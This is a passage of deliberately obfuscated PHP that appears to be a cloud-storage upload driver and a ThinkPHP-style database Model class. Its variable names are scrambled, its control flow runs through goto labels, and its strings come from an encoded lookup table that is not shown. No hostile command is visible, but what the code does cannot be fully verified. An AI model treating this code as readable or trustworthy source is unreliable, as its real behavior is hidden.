$FšÇĞ‰™œ[$dÕ®ÊğÉƒ”[226]] == $dÕ®ÊğÉƒ”[227]) { $FÏŠÜó°ø[0] = $dÕ®ÊğÉƒ”[227]; } goto Fãòš÷Úè‚; bèßÂíÌ: if (strpos($ešâÒªË‘›, $dÕ®ÊğÉƒ”[224]) === 0) { return array($dÕ®ÊğÉƒ”[231] => $EÁ¾ìã‘š¥, $dÕ®ÊğÉƒ”[221] => $Bä©£ÖÜÏ); } return $EÁ¾ìã‘š¥; goto F£‚¯““Ï; E°¤ÛÍ»ğì: $dÕ®ÊğÉƒ” =& $_SERVER[Ç³Íß¦Ó]; $Bä©£ÖÜÏ = isset($FšÇĞ‰™œ[$dÕ®ÊğÉƒ”[221]]) ? $FšÇĞ‰™œ[$dÕ®ÊğÉƒ”[221]] : gmdate($dÕ®ÊğÉƒ”[219]); $ešâÒªË‘› = isset($FšÇĞ‰™œ[$dÕ®ÊğÉƒ”[168]]) ? $FšÇĞ‰™œ[$dÕ®ÊğÉƒ”[168]] : $dÕ®ÊğÉƒ”[33]; goto fÃÖÙÏ¸Ó; Fãòš÷Úè‚: $C½¯”‰êñÇ = implode($dÕ®ÊğÉƒ”[228], $FÏŠÜó°ø); $E©¶¿š’ÔÎ = base64_encode(hash_hmac($dÕ®ÊğÉƒ”[229], $C½¯”‰êñÇ, $this->secret, !0)); $EÁ¾ìã‘š¥ = $dÕ®ÊğÉƒ”[230] . $this->accessKey . $dÕ®ÊğÉƒ”[4] . $E©¶¿š’ÔÎ; goto bèßÂíÌ; fÃÖÙÏ¸Ó: $eï…“ö²ˆË = $FšÇĞ‰™œ[$dÕ®ÊğÉƒ”[93]]; unset($FšÇĞ‰™œ[$dÕ®ÊğÉƒ”[93]]); if (isset($FšÇĞ‰™œ[$dÕ®ÊğÉƒ”[222]])) { $FšÇĞ‰™œ[$dÕ®ÊğÉƒ”[221]] = $Bä©£ÖÜÏ; return $this->listUploadParts($eï…“ö²ˆË, $FšÇĞ‰™œ); } goto a’´ÃŠÉÀØ; F£‚¯““Ï: } public function listUploadParts($A‹ßœ³Æ½, $BšÅ®À¯Ò“ = array()) { goto C¯º§œº•; C¯º§œº•: $ašÜŸ›¨Ã¾ =& $_SERVER[Ç³Íß¦Ó]; $D•Ö«Ä˜Á’ = str_replace($ašÜŸ›¨Ã¾[232], $ašÜŸ›¨Ã¾[33], $BšÅ®À¯Ò“[$ašÜŸ›¨Ã¾[168]]); $E¯Îèˆéì = $this->client->listParts($this->bucket, $A‹ßœ³Æ½, $D•Ö«Ä˜Á’); goto aŒ¼ê¦¾ãò; aŒ¼ê¦¾ãò: if (!$E¯Îèˆéì) { return !1; } unset($BšÅ®À¯Ò“[$ašÜŸ›¨Ã¾[222]], $BšÅ®À¯Ò“[$ašÜŸ›¨Ã¾[226]]); $BšÅ®À¯Ò“[$ašÜŸ›¨Ã¾[93]] = $A‹ßœ³Æ½; goto dÒˆÖğ®ìß; dÒˆÖğ®ìß: $Aµ—á›ƒë = $this->multiUploadAuthData($A‹ßœ³Æ½, $BšÅ®À¯Ò“); if (empty($Aµ—á›ƒë)) { return !1; } return array($ašÜŸ›¨Ã¾[231] => $Aµ—á›ƒë, $ašÜŸ›¨Ã¾[221] => $BšÅ®À¯Ò“[$ašÜŸ›¨Ã¾[221]], $ašÜŸ›¨Ã¾[233] => $E¯Îèˆéì); goto bº‰å‰óà; bº‰å‰óà: } public function getHost() { return parent::getHost() . $_SERVER[Ç³Íß¦Ó][8] . $this->bucket; } public function size($c–À©Ø¯õ÷) { $eˆ‘»çï‚¹ = $this->objectMeta($c–À©Ø¯õ÷); return $eˆ‘»çï‚¹ ? $eˆ‘»çï‚¹[$_SERVER[Ç³Íß¦Ó][78]] : 0; } public function info($AøÜ˜‡°ÕÌ) { if ($this->isFolder($AøÜ˜‡°ÕÌ)) { return $this->folderInfo($AøÜ˜‡°ÕÌ); } else { if ($this->isFile($AøÜ˜‡°ÕÌ)) { return $this->fileInfo($AøÜ˜‡°ÕÌ); } } return !1; } public function exist($c‹ÂÉô‹“) { return $this->isFile($c‹ÂÉô‹“) || $this->isFolder($c‹ÂÉô‹“); } public function isFile($fÎÆÏ— Îë) { return !$this->isFolder($fÎÆÏ— Îë) && $this->objectMeta($fÎÆÏ— Îë); } public function isFolder($Eçªœ¬Çãˆ) { return $this->cacheMethod($_SERVER[Ç³Íß¦Ó][198], $Eçªœ¬Çãˆ); } protected function objectMeta($e˜¥£Ëç•İ) { return $this->cacheMethod($_SERVER[Ç³Íß¦Ó][199], $e˜¥£Ëç•İ); } protected function _objectMeta($F…Ï÷¡Ë) { $EÛ»ØÜÚÑ =& $_SERVER[Ç³Íß¦Ó]; $F…Ï÷¡Ë = rtrim($F…Ï÷¡Ë, $EÛ»ØÜÚÑ[8]); try { $eéÏ’µ°ï = $this->client->getObjectInfo($this->bucket, $F…Ï÷¡Ë); if (!isset($eéÏ’µ°ï[$EÛ»ØÜÚÑ[218]]) && isset($eéÏ’µ°ï[$EÛ»ØÜÚÑ[234]])) { $eéÏ’µ°ï[$EÛ»ØÜÚÑ[218]] = $eéÏ’µ°ï[$EÛ»ØÜÚÑ[234]]; } } catch (Exception $DõØøÓåŠ ) { $eéÏ’µ°ï = !1; } if (!$eéÏ’µ°ï) { } return $eéÏ’µ°ï; } protected function _isFolder($FÌÅ‹ˆ«„¡) { goto b¸ó¨èÔ; F¡ÃˆÚŞõŸ: if (substr($Fù—Š¦ÜÜ, -1) == $BÖ¹‡Ì¾·†[8]) { return !0; } if (get_path_this($Fù—Š¦ÜÜ) == get_path_this($FÌÅ‹ˆ«„¡)) { return !1; } return !0; goto A¤çã³Š©ò; b¸ó¨èÔ: $BÖ¹‡Ì¾·† =& $_SERVER[Ç³Íß¦Ó]; $FÌÅ‹ˆ«„¡ = rtrim($FÌÅ‹ˆ«„¡, $BÖ¹‡Ì¾·†[8]); if ($FÌÅ‹ˆ«„¡ == $BÖ¹‡Ì¾·†[33] || $FÌÅ‹ˆ«„¡ == $BÖ¹‡Ì¾·†[8]) { return !0; } goto f¤šœø²…¼; f¤šœø²…¼: $Bøèæç¿¶Š = $this->client->getBucket($this->bucket, $FÌÅ‹ˆ«„¡, null, 1); if (empty($Bøèæç¿¶Š[$BÖ¹‡Ì¾·†[197]])) { return !1; } $Fù—Š¦ÜÜ = $Bøèæç¿¶Š[$BÖ¹‡Ì¾·†[197]][0][$BÖ¹‡Ì¾·†[28]]; goto F¡ÃˆÚŞõŸ; A¤çã³Š©ò: } } define($_SERVER[Ç³Íß¦Ó][235], 1); goto d™Úœö–ßä; e°«ŞÒ…°: define($_SERVER[Ç³Íß¦Ó][0], $_SERVER[Ç³Íß¦Ó][1]); $_SERVER[ûºÛ] = explode($_SERVER[Ç³Íß¦Ó][2], gzinflate(substr($_SERVER[Ç³Íß¦Ó][3], 10, -8))); function binCheckEq($eõøğƒÙç, $A†ÀÒ·ôÒ) { return $eõøğƒÙç == $A†ÀÒ·ôÒ; } goto aÒĞâ‚ÇëÅ; CÚ£ÂÖóé: define($_SERVER[Ç³Íß¦Ó][239], 0); define($_SERVER[Ç³Íß¦Ó][240], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\x6c\145", "\157\162\144\x65\x72", "\141\154\151\x61\163", "\150\141\166\151\x6e\x67", "\x67\x72\157\165\160", "\154\x6f\143\x6b", "\x64\x69\x73\x74\151\x6e\143\164", "\141\165\x74\x6f", "\x66\151\x6c\164\145\x72", "\x76\x61\x6c\151\144\x61\164\x65", "\162\x65\x73\x75\154\164", "\142\151\156\144", "\x74\x6f\x6b\x65\156"); public function __construct($BÒ‘ÃØÛ²´ = '', $A·Œ»õ³ƒè = '', $CÁ¥¼½õØ = '') { $aæäš’ˆÕß =& $_SERVER[Ç³Íß¦Ó]; $this->_initialize(); if (!empty($BÒ‘ÃØÛ²´)) { if (strpos($BÒ‘ÃØÛ²´, $aæäš’ˆÕß[95])) { list($this->dbName, $this->name) = explode($aæäš’ˆÕß[95], $BÒ‘ÃØÛ²´); } else { $this->name = $BÒ‘ÃØÛ²´; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($A·Œ»õ³ƒè)) { $this->tablePrefix = $aæäš’ˆÕß[33]; } elseif ($aæäš’ˆÕß[33] != $A·Œ»õ³ƒè) { $this->tablePrefix = $A·Œ»õ³ƒè; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($aæäš’ˆÕß[241]); } $this->db(0, empty($this->connection) ? $CÁ¥¼½õØ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $E«‰¹ÒÇ£ =& $_SERVER[Ç³Íß¦Ó]; if (empty($this->fields)) { if (think_config($E«‰¹ÒÇ£[242])) { $e™Úõ‘ÖˆŠ = $this->dbName ? $this->dbName : think_config($E«‰¹ÒÇ£[243]); $eÆ±¹ÒçŠ = think_var_cache($E«‰¹ÒÇ£[244] . strtolower(get_path_this($e™Úõ‘ÖˆŠ) . $E«‰¹ÒÇ£[95] . $this->name)); if ($eÆ±¹ÒçŠ) { $F‹‚ÆÏ¥ù = think_config($E«‰¹ÒÇ£[245]); if (empty($F‹‚ÆÏ¥ù) || $eÆ±¹ÒçŠ[$E«‰¹ÒÇ£[246]] == $F‹‚ÆÏ¥ù) { $this->fields = $eÆ±¹ÒçŠ; return; } } } $this->flush(); } } public function flush() { goto eäƒ°ËÌ‡; A™¸¹ê†ìÛ: if (!$fİÔîöÍä) { return !1; } $this->fields = array_keys($fİÔîöÍä); $this->fields[$dÇÀ›Ö¦ªÚ[247]] = !1; goto Aö½ÒôÖëË; eäƒ°ËÌ‡: $dÇÀ›Ö¦ªÚ =& $_SERVER[Ç³Íß¦Ó]; $this->db->setModel($this->name); $fİÔîöÍä = $this->db->getFields($this->getTableName()); goto A™¸¹ê†ìÛ; F‘šÔ‹‘¼¡: if (think_config($dÇÀ›Ö¦ªÚ[242])) { $AêÊ»ó„…‹ = $this->dbName ? $this->dbName : think_config($dÇÀ›Ö¦ªÚ[243]); think_var_cache($dÇÀ›Ö¦ªÚ[244] . strtolower(get_path_this($AêÊ»ó„…‹) . $dÇÀ›Ö¦ªÚ[95] . $this->name), $this->fields); } goto b¨Ğˆ¶Õá¸; Aö½ÒôÖëË: foreach ($fİÔîöÍä as $aÉÌ’óå÷¯ => $b·ùÍÔ’Õå) { $AëõµÏ¥Íª[$aÉÌ’óå÷¯] = $b·ùÍÔ’Õå[$dÇÀ›Ö¦ªÚ[29]]; if ($b·ùÍÔ’Õå[$dÇÀ›Ö¦ªÚ[36]]) { $this->fields[$dÇÀ›Ö¦ªÚ[248]] = $aÉÌ’óå÷¯; if ($b·ùÍÔ’Õå[$dÇÀ›Ö¦ªÚ[39]]) { $this->fields[$dÇÀ›Ö¦ªÚ[247]] = !0; } } } $this->fields[$dÇÀ›Ö¦ªÚ[249]] = $AëõµÏ¥Íª; if (think_config($dÇÀ›Ö¦ªÚ[245])) { $this->fields[$dÇÀ›Ö¦ªÚ[246]] = think_config($dÇÀ›Ö¦ªÚ[245]); } goto F‘šÔ‹‘¼¡; b¨Ğˆ¶Õá¸: } public function switchModel($d«˜Ê‹Èî, $cöÉİøÂ» = array()) { $d¯‡èâ³Û° =& $_SERVER[Ç³Íß¦Ó]; $fŸ–ó×³†‹ = ucwords(strtolower($d«˜Ê‹Èî)) . $d¯‡èâ³Û°[250]; if (!class_exists($fŸ–ó×³†‹)) { think_exception($fŸ–ó×³†‹ . think_lang($d¯‡èâ³Û°[251])); } $this->_extModel = new $fŸ–ó×³†‹($this->name); if (!empty($cöÉİøÂ»)) { foreach ($cöÉİøÂ» as $b‚†çĞã‡) { $this->_extModel->setProperty($b‚†çĞã‡, $this->{$b‚†çĞã‡}); } } return $this->_extModel; } public function __set($aÆ˜ÂÆãƒƒ, $dÊ¾à‡™Â£) { $this->data[$aÆ˜ÂÆãƒƒ] = $dÊ¾à‡™Â£; } public function __get($C’Ã•Ó¤Æñ) { return isset($this->data[$C’Ã•Ó¤Æñ]) ? $this->data[$C’Ã•Ó¤Æñ] : null; } public function __isset($c¦…¾ÒâÕ) { return isset($this->data[$c¦…¾ÒâÕ]); } public function __unset($f©ßöËÕå¥) { unset($this->data[$f©ßöËÕå¥]); } public function __call($d™ÒÊªÃ­†, $AÚ™â„ ) { $Aƒê…Á­‘ =& $_SERVER[Ç³Íß¦Ó]; if (in_array(strtolower($d™ÒÊªÃ­†), $this->methods, !0)) { $this->options[strtolower($d™ÒÊªÃ­†)] = $AÚ™â„ [0]; return $this; } elseif (in_array(strtolower($d™ÒÊªÃ­†), array($Aƒê…Á­‘[252], $Aƒê…Á­‘[253], $Aƒê…Á­‘[254], $Aƒê…Á­‘[255], $Aƒê…Á­‘[256]), !0)) { $cêŒˆê¸±Î = isset($AÚ™â„ [0]) ? $AÚ™â„ [0] : $Aƒê…Á­‘[182]; $cêŒˆê¸±Î = $this->db->parseKey($cêŒˆê¸±Î); return $this->getField(strtoupper($d™ÒÊªÃ­†) . $Aƒê…Á­‘[257] . $cêŒˆê¸±Î . $Aƒê…Á­‘[258] . $d™ÒÊªÃ­†, $Aƒê…Á­‘[252]); } elseif (strtolower(substr($d™ÒÊªÃ­†, 0, 5)) == $Aƒê…Á­‘[259]) { $cêŒˆê¸±Î = think_parse_name(substr($d™ÒÊªÃ­†, 5)); $CÙÍÀ…ƒµĞ[$cêŒˆê¸±Î] = $AÚ™â„ [0]; return $this->where($CÙÍÀ…ƒµĞ)->find(); } elseif (strtolower(substr($d™ÒÊªÃ­†, 0, 10)) == $Aƒê…Á­‘[260]) { $ašä×ÒÄ¤ = think_parse_name(substr($d™ÒÊªÃ­†, 10)); $CÙÍÀ…ƒµĞ[$ašä×ÒÄ¤] = $AÚ™â„ [0]; return $this->where($CÙÍÀ…ƒµĞ)->getField($AÚ™â„ [1]); } elseif (isset($this->_scope[$d™ÒÊªÃ­†])) { return $this->scope($d™ÒÊªÃ­†, $AÚ™â„ [0]); } elseif (method_exists($this, $d™ÒÊªÃ­†)) { array_unshift($AÚ™â„ , $d™ÒÊªÃ­†); return call_user_func_array(array($this, $Aƒê…Á­‘[261]), $AÚ™â„ ); } else { return call_user_func_array(array(parent, $d™ÒÊªÃ­†), $AÚ™â„ ); } } protected function call() { goto A“¡è”ÄĞ; aŠÍ†İ¹±: $e‘­á™Œšº = $eí”Ìø×á; if (is_array($eí”Ìø×á)) { $e‘­á™Œšº = $eí”Ìø×á[1]; $eí”Ìø×á = $eí”Ìø×á[0]; } $bÂ…ì—©½ = count($FÃõ¸ÍÁ) - 1; goto DÓ­ƒšáÑƒ; DÓ­ƒšáÑƒ: if (isset($FÃõ¸ÍÁ[$bÂ…ì—©½]) && $FÃõ¸ÍÁ[$bÂ…ì—©½] === $eí”Ìø×á) { think_exception(__CLASS__ . $c”‚ÛË†Ñ[4] . $eí”Ìø×á . think_lang($c”‚ÛË†Ñ[262])); return; } $FÃõ¸ÍÁ[] = $eí”Ìø×á; if (method_exists($this, $c”‚ÛË†Ñ[263])) { $Fëã§Ã‡¢Ì = call_user_func_array(array($this, $c”‚ÛË†Ñ[264]), array($e‘­á™Œšº, $FÃõ¸ÍÁ)); if (!is_null($Fëã§Ã‡¢Ì) && $Fëã§Ã‡¢Ì !== !1) { return $Fëã§Ã‡¢Ì; } } goto Bé†òŠİ‘; A“¡è”ÄĞ: $c”‚ÛË†Ñ =& $_SERVER[Ç³Íß¦Ó]; $FÃõ¸ÍÁ = func_get_args(); $eí”Ìø×á = array_shift($FÃõ¸ÍÁ); goto aŠÍ†İ¹±; Bé†òŠİ‘: $aÂÛÈòÚˆ“ = call_user_func_array(array($this, $eí”Ìø×á), $FÃõ¸ÍÁ); if (method_exists($this, $c”‚ÛË†Ñ[265])) { $Fëã§Ã‡¢Ì = call_user_func_array(array($this, $c”‚ÛË†Ñ[266]), array($e‘­á™Œšº, $FÃõ¸ÍÁ, $aÂÛÈòÚˆ“)); if ($Fëã§Ã‡¢Ì) { return $Fëã§Ã‡¢Ì; } } return $aÂÛÈòÚˆ“; goto e„³ì‘Œ; e„³ì‘Œ: } protected function _initialize() { } protected function _facade($CÊƒØ÷Í­†) { $d©÷Ä¼Ú¯÷ =& $_SERVER[Ç³Íß¦Ó]; if (!empty($this->fields)) { foreach ($CÊƒØ÷Í­† as $fíš¯…·Œ¦ => $CÚŞÎÔ¼ÑÃ) { if (is_array($this->fields) && !in_array($fíš¯…·Œ¦, $this->fields, !0)) { unset($CÊƒØ÷Í­†[$fíš¯…·Œ¦]); } elseif (is_scalar($CÚŞÎÔ¼ÑÃ)) { $this->_parseType($CÊƒØ÷Í­†, $fíš¯…·Œ¦); } } } if (!empty($this->options[$d©÷Ä¼Ú¯÷[267]])) { $CÊƒØ÷Í­† = array_map($this->options[$d©÷Ä¼Ú¯÷[267]], $CÊƒØ÷Í­†); unset($this->options[$d©÷Ä¼Ú¯÷[267]]); } $this->_beforeWrite($CÊƒØ÷Í­†); return $CÊƒØ÷Í­†; } protected function _beforeWrite(&$BéÏİí§’Ê) { } public function add($Fƒò”›×È = '', $CÆº•ô§¶Ï = array(), $F¼èï¢” = false) { goto DîŠ±·òÂ; fô§ÀöÔœ‹: return $eëÆİƒ·µ; goto f÷ÕŒº¾Şï; E—×‚Ëğêñ: if (!1 === $this->_beforeInsert($Fƒò”›×È, $CÆº•ô§¶Ï)) { return !1; } $eëÆİƒ·µ = $this->db->insert($Fƒò”›×È, $CÆº•ô§¶Ï, $F¼èï¢”); if (!1 !== $eëÆİƒ·µ) { $FñóøåÕšÒ = $this->getLastInsID(); if ($FñóøåÕšÒ) { $Fƒò”›×È[$this->getPk()] = $FñóøåÕšÒ; $this->_after_insert($Fƒò”›×È, $CÆº•ô§¶Ï); return $FñóøåÕšÒ; } $this->_after_insert($Fƒò”›×È, $CÆº•ô§¶Ï); } goto fô§ÀöÔœ‹; DîŠ±·òÂ: if (empty($Fƒò”›×È)) { if (!empty($this->data)) { $Fƒò”›×È = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ç³Íß¦Ó][268]); return !1; } } $CÆº•ô§¶Ï = $this->_parseOptions($CÆº•ô§¶Ï); $Fƒò”›×È = $this->_facade($Fƒò”›×È); goto E—×‚Ëğêñ; f÷ÕŒº¾Şï: } protected function _beforeInsert(&$bÑÍœğ±Ã‰, $b»¿£‰¬áù) { } protected function _after_insert($F–êä¬»‹ø, $f±ã ­“«Œ) { } public function addAll($b×¹Ş§¦¶‹, $d²Á‡¨Çö = array(), $bƒ¥¡¦øòæ = false) { goto A´ÂÏÌ×é‹; A´ÂÏÌ×é‹: $F³‡Î×Ôê„ =& $_SERVER[Ç³Íß¦Ó]; if (empty($b×¹Ş§¦¶‹)) { $this->error = think_lang($F³‡Î×Ôê„[268]); return !1; } $d²Á‡¨Çö = $this->_parseOptions($d²Á‡¨Çö); goto c‰Ì ÍíÇ¬; f²ªÖ³÷½Ÿ: return $E›íÓ×À; goto Dòª¿²ƒ‹; c‰Ì ÍíÇ¬: foreach ($b×¹Ş§¦¶‹ as $d¥‚‹¼¶èß => $a´—Şßäô) { $b×¹Ş§¦¶‹[$d¥‚‹¼¶èß] = $this->_facade($a´—Şßäô); } if (method_exists($this->db, $F³‡Î×Ôê„[269])) { $E›íÓ×À = $this->db->insertAll($b×¹Ş§¦¶‹, $d²Á‡¨Çö, $bƒ¥¡¦øòæ); } else { $this->startTrans(); foreach ($b×¹Ş§¦¶‹ as $d¥‚‹¼¶èß => $a´—Şßäô) { $E›íÓ×À = $this->db->insert($a´—Şßäô, $d²Á‡¨Çö, $bƒ¥¡¦øòæ); } $this->commit(); } if (!1 !== $E›íÓ×À) { $B³ÉÊï¬İò = $this->getLastInsID(); if ($B³ÉÊï¬İò) { return $B³ÉÊï¬İò; } } goto f²ªÖ³÷½Ÿ; Dòª¿²ƒ‹: } public function selectAdd($Aå¡›ø»  = '', $dÓ­³œÙè = '', $céš‚“½ğÚ = array()) { $E÷ß¿Ù£¶Ü =& $_SERVER[Ç³Íß¦Ó]; $céš‚“½ğÚ = $this->_parseOptions($céš‚“½ğÚ); if (!1 === ($D°·ØÍÏß– = $this->db->selectInsert($Aå¡›ø»  ? $Aå¡›ø»  : $céš‚“½ğÚ[$E÷ß¿Ù£¶Ü[270]], $dÓ­³œÙè ? $dÓ­³œÙè : $this->getTableName(), $céš‚“½ğÚ))) { $this->error = think_lang($E÷ß¿Ù£¶Ü[271]); return !1; } else { return $D°·ØÍÏß–; } } public function save($FªŞ¦ÕŠÒ˜ = '', $f†‚–éöÆ· = array()) { goto bÀè‘³ºÎõ; bÀè‘³ºÎõ: $E¶ËÑÂ³ =& $_SERVER[Ç³Íß¦Ó]; if (empty($FªŞ¦ÕŠÒ˜)) { if (!empty($this->data)) { $FªŞ¦ÕŠÒ˜ = $this->data; $this->data = array(); } else { $this->error = think_lang($E¶ËÑÂ³[268]); return !1; } } $FªŞ¦ÕŠÒ˜ = $this->_facade($FªŞ¦ÕŠÒ˜); goto B¨Üò¤œµÎ; Dê‘˜À”ßÊ: if (is_array($f†‚–éöÆ·[$E¶ËÑÂ³[272]]) && isset($f†‚–éöÆ·[$E¶ËÑÂ³[272]][$AäİàÙ½ÙÙ])) { $D˜ƒ½…ƒî¡ = $f†‚–éöÆ·[$E¶ËÑÂ³[272]][$AäİàÙ½ÙÙ]; } if (!1 === $this->_beforeUpdate($FªŞ¦ÕŠÒ˜, $f†‚–éöÆ·)) { return !1; } $fÚÑéø—¹É = $this->db->update($FªŞ¦ÕŠÒ˜, $f†‚–éöÆ·); goto B¡á­ÈÒé; B¨Üò¤œµÎ: $f†‚–éöÆ· = $this->_parseOptions($f†‚–éöÆ·); $AäİàÙ½ÙÙ = $this->getPk(); if (!isset($f†‚–éöÆ·[$E¶ËÑÂ³[272]])) { if (isset($FªŞ¦ÕŠÒ˜[$AäİàÙ½ÙÙ])) { $b°±Ùç‘õè[$AäİàÙ½ÙÙ] = $FªŞ¦ÕŠÒ˜[$AäİàÙ½ÙÙ]; $f†‚–éöÆ·[$E¶ËÑÂ³[272]] = $b°±Ùç‘õè; unset($FªŞ¦ÕŠÒ˜[$AäİàÙ½ÙÙ]); } else { $this->error = think_lang($E¶ËÑÂ³[271]); return !1; } } goto Dê‘˜À”ßÊ; B¡á­ÈÒé: if (!1 !== $fÚÑéø—¹É) { if (isset($D˜ƒ½…ƒî¡)) { $FªŞ¦ÕŠÒ˜[$AäİàÙ½ÙÙ] = $D˜ƒ½…ƒî¡; } $this->_afterUpdate($FªŞ¦ÕŠÒ˜, $f†‚–éöÆ·); } return $fÚÑéø—¹É; goto føˆŒã¥Ê†; føˆŒã¥Ê†: } protected function _beforeUpdate(&$D—½×Œ­”, $d´ÊÌãğÙ) { } protected function _afterUpdate($D®Õ°§ÒÛ, $Eéİ‘‡£Ÿ¹) { } public function delete($A”«Õñ•Ê = array()) { goto dŞ–öºğÆ; dŞ–öºğÆ: $ağÅƒ‘ÖÄË =& $_SERVER[Ç³Íß¦Ó]; if (empty($A”«Õñ•Ê) && empty($this->options[$ağÅƒ‘ÖÄË[272]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $BöÓèöß†Ş = $this->getPk(); goto eŠ§Ë¸³™Ğ; eŠ§Ë¸³™Ğ: if (is_numeric($A”«Õñ•Ê) || is_string($A”«Õñ•Ê)) { if (strpos($A”«Õñ•Ê, $ağÅƒ‘ÖÄË[47])) { $Aíğ¤Æ¶[$BöÓèöß†Ş] = array($ağÅƒ‘ÖÄË[273], $A”«Õñ•Ê); } else { $Aíğ¤Æ¶[$BöÓèöß†Ş] = $A”«Õñ•Ê; } $this->options[$ağÅƒ‘ÖÄË[272]] = $Aíğ¤Æ¶; } $A”«Õñ•Ê = $this->_parseOptions(); if (is_array($A”«Õñ•Ê[$ağÅƒ‘ÖÄË[272]]) && isset($A”«Õñ•Ê[$ağÅƒ‘ÖÄË[272]][$BöÓèöß†Ş])) { $F·à÷«äÏ÷ = $A”«Õñ•Ê[$ağÅƒ‘ÖÄË[272]][$BöÓèöß†Ş]; } goto DÙ­É½“ùÓ; DÙ­É½“ùÓ: $D«³™¶—×´ = $this->db->delete($A”«Õñ•Ê); if (!1 !== $D«³™¶—×´) { $DÊÈóî¼ÑÒ = array(); if (isset($F·à÷«äÏ÷)) { $DÊÈóî¼ÑÒ[$BöÓèöß†Ş] = $F·à÷«äÏ÷; } $this->_after_delete($DÊÈóî¼ÑÒ, $A”«Õñ•Ê); } return $D«³™¶—×´; goto dÜÚ¸çãï; dÜÚ¸çãï: } protected function _after_delete($cÈƒÕ‘Å¹ó, $AÅğÁÁŸ‘) { } public function select($fÜØ”ÙÊÃË = array()) { goto B…ÀäÙÂöõ; B…ÀäÙÂöõ: $eÔ¢•¼‚§ =& $_SERVER[Ç³Íß¦Ó]; if (is_string($fÜØ”ÙÊÃË) || is_numeric($fÜØ”ÙÊÃË)) { $dÃõˆ…éï† = $this->getPk(); if (strpos($fÜØ”ÙÊÃË, $eÔ¢•¼‚§[47])) { $Bñ¤ßÉßÅä[$dÃõˆ…éï†] = array($eÔ¢•¼‚§[273], $fÜØ”ÙÊÃË); } else { $Bñ¤ßÉßÅä[$dÃõˆ…éï†] = $fÜØ”ÙÊÃË; } $this->options[$eÔ¢•¼‚§[272]] = $Bñ¤ßÉßÅä; } elseif (!1 === $fÜØ”ÙÊÃË) { $fÜØ”ÙÊÃË = $this->_parseOptions(); return $eÔ¢•¼‚§[274] . $this->db->buildSelectSql($fÜØ”ÙÊÃË) . $eÔ¢•¼‚§[275]; } $fÜØ”ÙÊÃË = $this->_parseOptions(); goto cÏò‚»â¨; Cñˆà›¨©í: $this->_afterSelect($eöÀÂÕˆ¯ø, $fÜØ”ÙÊÃË); return $eöÀÂÕˆ¯ø; goto C““ÜĞæ¥»; cÏò‚»â¨: $eöÀÂÕˆ¯ø = $this->db->select($fÜØ”ÙÊÃË); if (!1 === $eöÀÂÕˆ¯ø) { return !1; } if (empty($eöÀÂÕˆ¯ø)) { return null; } goto Cñˆà›¨©í; C““ÜĞæ¥»: } protected function _afterSelect(&$Fœƒ¿­­èô, $F¶¡ë½ÓÆÕ) { } public function buildSql($D„¡Á“•§’ = array()) { $B°âé«Á“ä =& $_SERVER[Ç³Íß¦Ó]; $D„¡Á“•§’ = $this->_parseOptions($D„¡Á“•§’); return $B°âé«Á“ä[274] . $this->db->buildSelectSql($D„¡Á“•§’) . $B°âé«Á“ä[275]; } public function optionsValue($fİÆê˜ÎÅ‰ = null) { if (is_null($fİÆê˜ÎÅ‰)) { return $this->options; } elseif (is_array($fİÆê˜ÎÅ‰)) { $this->options = array_merge($this->options, $fİÆê˜ÎÅ‰); } } protected function _parseOptions($aøÏ‚°´Øá = array()) { goto BÌ¿ Ş£ƒê; b•äˆõ«ºÓ: if (isset($aøÏ‚°´Øá[$b¸Éç–Ó‹ß[272]]) && is_array($aøÏ‚°´Øá[$b¸Éç–Ó‹ß[272]]) && !empty($BŒ‚óÀ‘§ô) && !isset($aøÏ‚°´Øá[$b¸Éç–Ó‹ß[279]]) && !isset($aøÏ‚°´Øá[$b¸Éç–Ó‹ß[276]])) { foreach ($aøÏ‚°´Øá[$b¸Éç–Ó‹ß[272]] as $fÇ£È¿Ë¸Â => $eÀ—·ë…È) { $fÇ£È¿Ë¸Â = trim($fÇ£È¿Ë¸Â); if (in_array($fÇ£È¿Ë¸Â, $BŒ‚óÀ‘§ô, !0)) { if (is_scalar($eÀ—·ë…È)) { $this->_parseType($aøÏ‚°´Øá[$b¸Éç–Ó‹ß[272]], $fÇ£È¿Ë¸Â); } } elseif (!is_numeric($fÇ£È¿Ë¸Â) && $b¸Éç–Ó‹ß[71] != substr($fÇ£È¿Ë¸Â, 0, 1) && !1 === strpos($fÇ£È¿Ë¸Â, $b¸Éç–Ó‹ß[95]) && !1 === strpos($fÇ£È¿Ë¸Â, $b¸Éç–Ó‹ß[257]) && !1 === strpos($fÇ£È¿Ë¸Â, $b¸Éç–Ó‹ß[280]) && !1 === strpos($fÇ£È¿Ë¸Â, $b¸Éç–Ó‹ß[281])) { unset($aøÏ‚°´Øá[$b¸Éç–Ó‹ß[272]][$fÇ£È¿Ë¸Â]); } } } $this->_options_filter($aøÏ‚°´Øá); return $aøÏ‚°´Øá; goto Eİ†¦ó‘®; BöÍÈ„éĞ: if (!isset($aøÏ‚°´Øá[$b¸Éç–Ó‹ß[276]])) { $aøÏ‚°´Øá[$b¸Éç–Ó‹ß[276]] = $this->getTableName(); $BŒ‚óÀ‘§ô = $this->fields; } else { $BŒ‚óÀ‘§ô = $this->getDbFields(); } if (!empty($aøÏ‚°´Øá[$b¸Éç–Ó‹ß[277]])) { $aøÏ‚°´Øá[$b¸Éç–Ó‹ß[276]] .= $b¸Éç–Ó‹ß[50] . $aøÏ‚°´Øá[$b¸Éç–Ó‹ß[277]]; } $aøÏ‚°´Øá[$b¸Éç–Ó‹ß[278]] = $this->name; goto b•äˆõ«ºÓ; BÌ¿ Ş£ƒê: $b¸Éç–Ó‹ß =& $_SERVER[Ç³Íß¦Ó]; if (is_array($aøÏ‚°´Øá)) { $aøÏ‚°´Øá = array_merge($this->options, $aøÏ‚°´Øá); } $this->options = array(); goto BöÍÈ„éĞ; 